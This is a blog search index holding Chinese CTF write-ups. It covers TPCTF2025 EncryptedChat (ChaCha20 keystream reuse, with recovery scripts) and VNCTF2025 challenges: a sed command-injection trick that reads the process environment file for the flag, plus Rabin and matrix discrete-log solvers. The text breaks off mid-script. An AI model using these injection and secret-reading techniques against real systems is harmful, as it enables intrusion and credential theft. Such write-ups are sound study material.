<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TPCTF2025 EncryptedChat writeup</title>
    <link href="/2025/03/25/TPCTF2025/"/>
    <url>/2025/03/25/TPCTF2025/</url>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><strong>题目描述</strong></h2><blockquote><p>This chat service employs robust end-to-end encryption. Some users report that they occasionally receive corrupted text. Nonetheless, security is the top priority, and minor corruption does not compromise confidentiality.</p></blockquote>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-21ac247e" role="button" aria-expanded="false" aria-controls="collapse-21ac247e">        <div class="fold-arrow">▶</div>source code      </div>      <div class="fold-collapse collapse" id="collapse-21ac247e">        <div class="fold-content">          <ul><li><p>server.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> socket, AF_INET, SOCK_STREAM<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, Lock<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>, <span class="hljs-type">Tuple</span><br><br>PORT = <span class="hljs-number">1337</span><br><br>nonce = get_random_bytes(<span class="hljs-number">12</span>)<br><br>sock = socket(AF_INET, SOCK_STREAM)<br>sock.bind((<span class="hljs-string">&#x27;&#x27;</span>, PORT))<br>sock.listen(<span class="hljs-number">5</span>)<br><br>messages: <span class="hljs-type">List</span>[<span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bytes</span>, socket]] = []<br>clients: <span class="hljs-type">Dict</span>[socket, <span class="hljs-built_in">int</span>] = &#123;&#125;<br>mutex = Lock()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward_messages</span>() -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">with</span> mutex:<br>        <span class="hljs-keyword">for</span> client, pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(clients.items()):<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">for</span> message, sender <span class="hljs-keyword">in</span> messages[pos:]:<br>                    <span class="hljs-keyword">if</span> sender != client:<br>                        client.sendall(message)<br>                clients[client] = <span class="hljs-built_in">len</span>(messages)<br>            <span class="hljs-keyword">except</span> (ConnectionError, BrokenPipeError):<br>                <span class="hljs-keyword">del</span> clients[client]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_client</span>(<span class="hljs-params">client: socket, addr</span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">global</span> messages<br>    <span class="hljs-keyword">try</span>:<br>        client.sendall(nonce)<br>        forward_messages()<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            message = client.recv(<span class="hljs-number">4096</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> message:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">with</span> mutex:<br>                messages.append((message, client))<br>            forward_messages()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Received message from <span class="hljs-subst">&#123;addr&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">except</span> (ConnectionError, BrokenPipeError):<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">with</span> mutex:<br>            clients.pop(client, <span class="hljs-literal">None</span>)<br>        client.close()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Connection from <span class="hljs-subst">&#123;addr&#125;</span> closed&#x27;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        client, addr = sock.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;New connection from <span class="hljs-subst">&#123;addr&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">with</span> mutex:<br>            clients[client] = <span class="hljs-number">0</span><br>        Thread(target=handle_client, args=(client, addr), daemon=<span class="hljs-literal">True</span>).start()<br><span class="hljs-keyword">except</span> KeyboardInterrupt:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">finally</span>:<br>    sock.close()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;messages.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    stream = <span class="hljs-string">b&#x27;&#x27;</span>.join(m <span class="hljs-keyword">for</span> m, _ <span class="hljs-keyword">in</span> messages)<br>    <span class="hljs-built_in">print</span>(b64encode(stream).decode(), file=f)<br></code></pre></td></tr></table></figure></p></li><li><p>client.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> select <span class="hljs-keyword">import</span> select<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>PORT = <span class="hljs-number">1337</span><br><br>key = os.environ.get(<span class="hljs-string">&#x27;CHAT_KEY&#x27;</span>)<br><span class="hljs-keyword">assert</span> key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;CHAT_KEY environment variable must be set&#x27;</span><br>key = b64decode(key)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key) == <span class="hljs-number">32</span>, <span class="hljs-string">&#x27;Key must be 32 bytes long&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Usage: python client.py &lt;server_address&gt;&#x27;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br>server_address = sys.argv[<span class="hljs-number">1</span>]<br><br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sock.connect((server_address, PORT))<br><br>nonce = sock.recv(<span class="hljs-number">12</span>)<br>cipher = ChaCha20.new(key=key, nonce=nonce)<br><br>sock.setblocking(<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        readable, _, _ = select([sock, sys.stdin], [], [])<br>        <span class="hljs-keyword">if</span> sock <span class="hljs-keyword">in</span> readable:<br>            data = sock.recv(<span class="hljs-number">4096</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                <span class="hljs-keyword">break</span><br>            data = cipher.encrypt(data)<br>            <span class="hljs-built_in">print</span>(data.decode(errors=<span class="hljs-string">&#x27;replace&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> sys.stdin <span class="hljs-keyword">in</span> readable:<br>            data = sys.stdin.readline()<br>            data = cipher.encrypt(data.encode())<br>            sock.sendall(data)<br><span class="hljs-keyword">finally</span>:<br>    sock.close()<br></code></pre></td></tr></table></figure></p></li><li><p><a href="/file/TPCTF2025/messages.txt" download>messages.txt</a></p></li></ul>        </div>      </div>    </div><h2 id="漏洞利用"><strong>漏洞利用</strong></h2><h3 id="chacha20加密原理"><strong>ChaCha20加密原理</strong></h3><ul><li>实例化一个加密算法<code>ChaCha20.new(key=key, nonce=nonce)</code>，它会用key和nonce初始化自己的密钥流并且通过迭代生成新的密钥流，再用密钥流与明文进行<strong>异或</strong>得到密文。</li><li>新密钥流迭代过程详见<a href="https://zhuanlan.zhihu.com/p/12294152293">知乎</a>，在本题中并不重要。</li></ul><h3 id="代码运行逻辑"><strong>代码运行逻辑</strong></h3><ul><li>题目使用了<code>ChaCha20</code>对消息进行加密，server主要负责开启一个聊天室并提供<code>nonce</code>，client共享 ChatKey 并利用聊天室提供的<code>nonce</code>实例化一个加密算法<code>cipher = ChaCha20.new(key=key, nonce=nonce)</code>，由于服务器收到的消息都是加密过后的，并且不知道 ChatKey 的内容，因此无法看到明文;</li><li>client如何看到其他使用者的明文呢？由于发送消息的时候发送者消耗了<code>ChaCha20</code>的部分密钥段，而在接收端会使用该部分密钥段曲加密密文，由于是<strong>异或</strong>操作，会正常显示明文。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        readable, _, _ = select([sock, sys.stdin], [], [])<br>        <span class="hljs-keyword">if</span> sock <span class="hljs-keyword">in</span> readable:<br>            data = sock.recv(<span class="hljs-number">4096</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                <span class="hljs-keyword">break</span><br>            data = cipher.encrypt(data)<br>            <span class="hljs-built_in">print</span>(data.decode(errors=<span class="hljs-string">&#x27;replace&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> sys.stdin <span class="hljs-keyword">in</span> readable:<br>            data = sys.stdin.readline()<br>            data = cipher.encrypt(data.encode())<br>            sock.sendall(data)<br><span class="hljs-keyword">finally</span>:<br>    sock.close()<br></code></pre></td></tr></table></figure></li></ul><h3 id="题目提示与漏洞关键"><strong>题目提示与漏洞关键</strong></h3><ul><li>可以看到在解密其他使用者发送的密文时，使用的是<code>data.decode(errors='replace')</code>，而且描述中也提及部分使用者反映会看到乱码，这是由消息竞争引起的。试想一下，如果两个使用者同时发送某段消息，会导致加密他们的消息时使用的是<strong>同一段密钥流</strong>，解密的时候会是<strong>下一段密钥流</strong>，所以都会显示为乱码；</li><li>由于加密使用了<strong>同一段密钥流</strong>，服务器便可以通过语义分析来恢复明文。想象一下两段有语义的明文<code>MessageA</code>和<code>MessageB</code>，经过同一段密钥流 C 加密后传给服务器， 那么服务器通过异或这两段密钥便可以得到 <code>MessageA ^ MessageB</code>的值，也就是说，如果我知道部分<code>MessageA</code>的明文，便可获得部分<code>MessageB</code>，再根据语义分析猜测明文后面的部分，便可以恢复出整段明文。</li></ul><h3 id="密文解析"><strong>密文解析</strong></h3><ul><li>题目还给我们上了层强度，最后服务器把所有密文串起来存到文本中。也就是说，我们的目标不仅是找出特定的重合段并恢复 明文，还得找出这一串密文中特定密文的起始位置与结束位置。</li><li>设计代码，由于<code>MessageA ^ MessageB</code>的每个比特的最高位都是0，用来确定并发段的位置。从头遍历密文串，规定消息间隔d，存储第i位与第i+d位异或的结果，如果出现大段比特的最高位都是0的部分我们可以断定这就是并发段的位置： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;messages.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br>message = base64.b64decode(f)<br><br>maxd = <span class="hljs-number">500</span><br>mind = <span class="hljs-number">50</span><br>indexres = []<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mind,maxd):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)-maxd):<br>        res+=<span class="hljs-string">&#x27;@&#x27;</span> <span class="hljs-keyword">if</span> (message[i]^message[i+d])&lt;<span class="hljs-number">128</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;@&quot;</span>*mind <span class="hljs-keyword">in</span> res:<br>        <span class="hljs-keyword">for</span> lenth <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mind,maxd):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;@&quot;</span>*lenth <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:<br>                <span class="hljs-keyword">break</span><br>        idx = res.find(<span class="hljs-string">&quot;@&quot;</span>*(lenth-<span class="hljs-number">1</span>))<br>        indexres.append([idx,idx+lenth,idx+d,idx+d+lenth])<br>indexres.sort(key=<span class="hljs-keyword">lambda</span> x:(x[<span class="hljs-number">0</span>],x[<span class="hljs-number">2</span>]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexres:<br>    <span class="hljs-built_in">print</span>(i)    <span class="hljs-comment"># 并发</span><br></code></pre></td></tr></table></figure> <img src="/img/TPCTF2025/TPCTF2025_1.png" alt="alt text" /></li><li>从结果可以看出（列表前两位是第一段消息的开头结尾位置，后两位是第二段消息的开头结尾位置），有两大块消息并发的时机，前一段从1187-3437，后一段从7473-9831，每条消息长度大概是200字符左右。</li></ul><h3 id="明文恢复"><strong>明文恢复</strong></h3><ul><li>第一块消息并发的时机明文恢复和第二块的操作是一样的，这里以第一块消息为例。现在我们的已知明文只有<code>TPCTF&#123;</code>，并且并不知道它在这些消息中的位置。但是可以通过遍历所有的可能位置，恢复其他消息的明文，通过其他消息的可读性来确定位置： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;messages.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br>message = base64.b64decode(f)<br><br>msglis1 = [[<span class="hljs-number">1187</span>, <span class="hljs-number">1428</span>],<br>        [<span class="hljs-number">1426</span>, <span class="hljs-number">1708</span>],<br>        [<span class="hljs-number">1726</span>, <span class="hljs-number">2001</span>],<br>        [<span class="hljs-number">2005</span>, <span class="hljs-number">2281</span>],<br>        [<span class="hljs-number">2277</span>, <span class="hljs-number">2736</span>],<br>        [<span class="hljs-number">2737</span>, <span class="hljs-number">2955</span>],<br>        [<span class="hljs-number">2954</span>, <span class="hljs-number">3139</span>],<br>        [<span class="hljs-number">3252</span>, <span class="hljs-number">3437</span>]]<br><br>flag = <span class="hljs-string">b&quot;TPCTF&#123;&quot;</span><br><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1187</span>,<span class="hljs-number">3437</span>):<br>    <span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> msglis1:<br>        start,end = msg<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start-<span class="hljs-number">10</span>,end+<span class="hljs-number">9</span>):<br>            tmp = <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(message[pos+p]^message[j+p]^flag[p]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> string.printable:<br>                    <span class="hljs-keyword">break</span><br>                tmp += <span class="hljs-built_in">chr</span>(message[pos+p]^message[j+p]^flag[p])<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(pos,start,j-start,tmp)<br></code></pre></td></tr></table></figure> <img src="/img/TPCTF2025/TPCTF2025_2.png" alt="alt text" /></li><li>在输出中看到可疑片段，经过分析可以看到<code>TPCTF&#123;</code>在3042的位置可以恢复出其他明文片段，而且其他明文的位置分别为<code>[1275,1514,1814,2094,2368,2827,3340]</code>。</li><li>接下来步骤就显而易见了，扩充其他位置的语义来恢复flag片段，比如在1814的位置后面肯定是空格等等，过程不再赘述（虽然也很折磨，但是还是很有趣的）。</li><li>这里就只放第一块明文的恢复结果，第二块结果就交给读者了。🥰 <img src="/img/TPCTF2025/TPCTF2025_3.png" alt="alt text" /></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF writeup</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2025 writeup</title>
    <link href="/2025/02/09/VNCTF2025/"/>
    <url>/2025/02/09/VNCTF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="welcome"><strong>Welcome</strong></h1><p>签到做了一个小时，我还有救吗😇</p><h2 id="欢迎">欢迎</h2><ul><li>打开网页是一个命令执行窗口，可以执行sed指令对文件内容的<code>&#123;&#125;</code>进行替换； <img src="/img/VNCTF2025/VNCTF2025_1.png" alt="alt text" /></li><li>替换词和文件名是可以更改的，并且给出了提示flag在环境变量内部，一开始的思路是将替换词改为环境变量中的变量，但是由于单引号不能自动展开变量，而且替换词内过滤了单引号的闭合(可以执行多条指令)，因此如下方法也是不行的： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed <span class="hljs-string">&#x27;s/&#123;.*&#125;/&#x27;</span><span class="hljs-string">&quot;<span class="hljs-variable">$FLAG</span>&quot;</span><span class="hljs-string">&#x27;/g&#x27;</span> ./example.txt<br></code></pre></td></tr></table></figure></li><li>那就只能在文件名处动手脚了，直接读取进程的环境变量文件，得到flag： <img src="/img/VNCTF2025/VNCTF2025_2.png" alt="alt text" /></li></ul><h1 id="crypto"><strong>Crypto</strong></h1><p>大部分都是爆破，时间差点不够🤪</p><h2 id="easymath">easymath</h2><ul><li>题目给了密文<code>c=pow(flag,2,N)</code>，其中N是由三个质数而得的，并且提供了<code>(x - n[0]) * (x - n[1]) * (x - n[2])</code>展开后的多项式；</li><li>首先通过sage分解多项式得到三个大质数的解： <img src="/img/VNCTF2025/VNCTF2025_3.png" alt="alt text" /></li><li>解决<code>c=pow(flag,2,N)</code>使用Rabin算法，其中的三个质因数都是模四余三的大质数，那么可得 <span class="math display">\[ m \equiv \pm c^{\frac{p_i+1}{4}} mod \; p_i \]</span> 三组同余方程可以用中国剩余定理，脚本如下： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>N = <span class="hljs-number">1</span> <br>n = [<span class="hljs-number">5487564316951417093934647798659941512646442958127439071827</span>, <span class="hljs-number">5908636118089697338533572785710162817248001570348495067227</span>, <span class="hljs-number">3868765709106144154703556118635822400623994075212553582411</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n:<br>    N*=i<br>c = <span class="hljs-number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span><br>c1 = n[<span class="hljs-number">0</span>]-<span class="hljs-built_in">pow</span>(c,(n[<span class="hljs-number">0</span>]+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,n[<span class="hljs-number">0</span>])<br>c2 = n[<span class="hljs-number">1</span>]-<span class="hljs-built_in">pow</span>(c,(n[<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,n[<span class="hljs-number">1</span>])<br>c3 = <span class="hljs-built_in">pow</span>(c,(n[<span class="hljs-number">2</span>]+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,n[<span class="hljs-number">2</span>])<br>N1 = N // n[<span class="hljs-number">0</span>]<br>N2 = N // n[<span class="hljs-number">1</span>]<br>N3 = N // n[<span class="hljs-number">2</span>]<br>M1 = gmpy2.invert(N1, n[<span class="hljs-number">0</span>])<br>M2 = gmpy2.invert(N2, n[<span class="hljs-number">1</span>])<br>M3 = gmpy2.invert(N3, n[<span class="hljs-number">2</span>])<br>m = (c1 * N1 * M1 + c2 * N2 * M2 + c3 * N3 * M3) % N<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">pow</span>(m,<span class="hljs-number">2</span>,N)==c<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure> <img src="/img/VNCTF2025/VNCTF2025_4.png" alt="alt text" /></li></ul><h2 id="ss0hurt">ss0Hurt</h2><ul><li>题目的关键代码： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">self, x, y, z</span>):<br>    <span class="hljs-keyword">return</span> vector([<span class="hljs-number">5</span> * x + y - <span class="hljs-number">5</span> * z, <span class="hljs-number">5</span> * y - z, <span class="hljs-number">5</span> * z])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mat</span>(<span class="hljs-params">self, m</span>):<br>    PR = <span class="hljs-variable language_">self</span>.P[<span class="hljs-string">&#x27;x,y,z&#x27;</span>]<br>    x,y,z = PR.gens()<br>    <span class="hljs-keyword">if</span> m != <span class="hljs-number">0</span>:<br>        plana = <span class="hljs-variable language_">self</span>.Mat(m//<span class="hljs-number">2</span>)<br>        planb = plana(*plana)<br>        <span class="hljs-keyword">if</span> m % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> planb<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.process(*planb)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.process(*PR.gens())<br></code></pre></td></tr></table></figure></li><li>给定一个初始向量V，<code>Mat</code>函数的加密过程就是给V乘上一个矩阵G，得到最后的结果向量Y，假设输入密文为m，则加密过程为 <span class="math display">\[ G^{m+2^{m.bit\_lenth()}} \cdot V = Y\]</span></li><li>参考<a href="https://triodelzx.github.io/2024/07/12/%E8%8B%A5%E5%B0%94%E5%BD%93%E6%A0%87%E5%87%86%E5%9E%8B%E4%B8%8E%E7%9F%A9%E9%98%B5%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98/">矩阵离散对数问题</a>编写解题脚本： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span>*<br><br>G = [[<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">5</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>]]<br>V = [[<span class="hljs-number">2025</span>],[<span class="hljs-number">208</span>],[<span class="hljs-number">209</span>]]<br>Y = [[<span class="hljs-number">17199707718762989481733793569240992776243099972784327196212023936622130204798694753865087501654381623876011128783229020278210160383185417670794284015692458326761011808048967854332413536183785458993128524881447529380387804712214305034841856237045463243243451585619997751904403447841431924053651568039257094910</span>], [<span class="hljs-number">62503976674384744837417986781499538335164333679603320998241675970253762411134672614307594505442798271581593168080110727738181755339828909879977419645331630791420448736959554172731899301884779691119177400457640826361914359964889995618273843955820050051136401731342998940859792560938931787155426766034754760036</span>], [<span class="hljs-number">93840121740656543170616546027906623588891573113673113077637257131079221429328035796416874995388795184080636312185908173422461254266536066991205933270191964776577196573147847000446118311985331680378772920169894541350064423243733498672684875039906829095473677927238488927923581806647297338935716890606987700071</span>]]<br><br>p = <span class="hljs-number">106743081253087007974132382690669187409167641660258665859915640694456867788135702053312073228376307091325146727550371538313884850638568106223326195447798997814912891375244381751926653858549419946547894675646011818800255999071070352934719005006228971056393128007601573916373180007524930454138943896336817929823</span><br>n = <span class="hljs-number">3</span><br><br>M_G = matrix(GF(p),G)<br>v = matrix(GF(p),V)<br>y = matrix(GF(p),Y)<br><br>J, P = M_G.jordan_form(subdivide = <span class="hljs-literal">False</span>,transformation = <span class="hljs-literal">True</span>)<br>t = P**-<span class="hljs-number">1</span> * v<br>z = P**-<span class="hljs-number">1</span> * y<br>lambda0 = J[n-<span class="hljs-number">1</span>][n-<span class="hljs-number">1</span>]<br><br>x = lambda0 * (t[n-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]*z[n-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] - t[n-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]*z[n-<span 